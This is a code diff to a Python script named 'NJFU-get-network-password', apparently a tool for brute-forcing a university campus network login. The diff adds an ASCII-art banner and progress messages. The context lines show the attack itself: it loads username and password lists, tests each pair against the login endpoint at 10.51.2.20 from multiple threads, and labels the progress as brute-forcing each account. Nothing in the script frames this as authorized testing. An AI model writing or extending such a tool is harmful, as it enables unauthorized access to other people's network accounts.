@@ -17,6 +17,42 @@ log.basicConfig(
 )
 
 
+def banner():
+    # banner!!!
+    print("\033[1;35mNJFU-get-network-password\nauthored by:\033[0m")
+
+    # black把这里搞得一团糟...
+    print(
+        "\033[1;31m    _____  __     __   ______   __     __  \033[0m         \033[1;34m _______   ________   \033[0m"
+    )
+    print(
+        "\033[1;31m   |     \|  \   |  \ /      \ |  \   |  \ \033[0m         \033[1;34m|       \ |        \  \033[0m"
+    )
+    print(
+        "\033[1;31m    \$$$$$| $$   | $$|  $$$$$$\| $$   | $$ \033[0m         \033[1;34m| $$$$$$$\| $$$$$$$$  \033[0m"
+    )
+    print(
+        "\033[1;31m      | $$| $$   | $$| $$__| $$| $$   | $$ \033[0m         \033[1;34m| $$__| $$| $$__      \033[0m"
+    )
+    print(
+        "\033[1;31m __   | $$ \$$\ /  $$| $$    $$ \$$\ /  $$ \033[0m         \033[1;34m| $$    $$| $$  \     \033[0m"
+    )
+    print(
+        "\033[1;31m|  \  | $$  \$$\  $$ | $$$$$$$$  \$$\  $$  \033[0m         \033[1;34m| $$$$$$$\| $$$$$     \033[0m"
+    )
+    print(
+        "\033[1;31m| $$__| $$   \$$ $$  | $$  | $$   \$$ $$   \033[0m ______  \033[1;34m| $$  | $$| $$_____   \033[0m"
+    )
+    print(
+        "\033[1;31m \$$    $$    \$$$   | $$  | $$    \$$$    \033[0m|      \ \033[1;34m| $$  | $$| $$     \  \033[0m"
+    )
+    print(
+        "\033[1;31m  \$$$$$$      \$     \$$   \$$     \$     \033[0m \$$$$$$ \033[1;34m \$$   \$$ \$$$$$$$$  \033[0m"
+    )
+
+    print("\n-----------------------start-----------------------\n")
+
+
 def test(usrname, password, plm):
     # 测试pwd是否正确
     url = "http://10.51.2.20/drcom/login"
@@ -79,6 +115,8 @@ def thread_func(usrname, password):
     MAXTHREADNUM += 1
 
 
+banner()  # banner!!!!
+
 # 检查result文件是否存在
 if os.path.exists("result.json"):
     results = json.load(open("result.json", "r"))
@@ -93,18 +131,21 @@ else:  # 使用默认内容
 with open("username.txt", "r") as f:
     username_list = f.readlines()
 username_list = [username.strip() for username in username_list]
+print(f"加载用户名数量: {len(username_list)}")
 username_list = username_list[current_username:]
 
 # 读取处理密码
 with open("password.txt", "r") as f:
     password_list = f.readlines()
 password_list = [password.strip() for password in password_list]
+print(f"加载密码条数: {len(password_list)}\n")
 password_list = password_list[current_password:]
+
 
 for username in username_list:
 
     bar = processbar.ProgressBar(
-        total=len(password_list), info="正在爆破 " + str(username)
+        total=len(password_list), info="正在爆破账号 " + str(username) + " "
     )
 
     couter = current_password  # 记录当前密码索引
